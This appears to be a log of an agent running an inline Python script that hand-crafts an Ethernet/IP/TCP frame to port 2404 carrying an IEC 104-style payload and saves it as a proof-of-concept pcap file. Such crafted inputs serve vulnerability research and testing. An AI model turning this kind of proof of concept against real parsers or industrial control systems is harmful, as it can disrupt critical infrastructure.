Running command: cd /workspace && python3 - <<'PY'
import struct, socket

def checksum(data):
    if len(data)%2: data += b'\0'
    s=sum((data[i]<<8)+data[i+1] for i in range(0,len(data),2))
    while s>>16: s=(s&0xffff)+(s>>16)
    return (~s)&0xffff

payload=bytes([0x68,0x0c,0x00,0x00,0x00,0x00,0x01,0x06,0x01,0x00,0x00,0x00,0x00,0x00])
# Ethernet
eth_dst=b'\x02\x00\x00\x00\x00\x02'; eth_src=b'\x02\x00\x00\x00\x00\x01'; eth_type=struct.pack('!H',0x0800)
# IP
src=socket.inet_aton('10.0.0.1'); dst=socket.inet_aton('10.0.0.2')
ver_ihl=0x45; tos=0; total_len=20+20+len(payload); ident=0x1234; flags_frag=0x4000; ttl=64; proto=6; ipchk=0
ip=struct.pack('!BBHHHBBH4s4s',ver_ihl,tos,total_len,ident,flags_frag,ttl,proto,ipchk,src,dst)
ipchk=checksum(ip); ip=struct.pack('!BBHHHBBH4s4s',ver_ihl,tos,total_len,ident,flags_frag,ttl,proto,ipchk,src,dst)
# TCP
sport=12345; dport=2404; seq=1; ack=0; dataoff_flags=(5<<12)|0x18; window=8192; tcpchk=0; urg=0
tcp=struct.pack('!HHIIHHHH',sport,dport,seq,ack,dataoff_flags,window,tcpchk,urg)
pseudo=src+dst+struct.pack('!BBH',0,proto,len(tcp)+len(payload))
tcpchk=checksum(pseudo+tcp+payload)
tcp=struct.pack('!HHIIHHHH',sport,dport,seq,ack,dataoff_flags,window,tcpchk,urg)
packet=eth_dst+eth_src+eth_type+ip+tcp+payload
# pcap little endian microsecond, LINKTYPE_ETHERNET 1
pcap=struct.pack('<IHHIIII',0xa1b2c3d4,2,4,0,0,65535,1)
# timestamp sec/usec, incl_len/orig_len
pcap+=struct.pack('<IIII',1,0,len(packet),len(packet))+packet
open('/workspace/poc1.pcap','wb').write(pcap)
print('wrote', len(pcap), len(packet), len(payload), payload.hex())
PY
file /workspace/poc1.pcap && ls -l /workspace/poc1.pcap
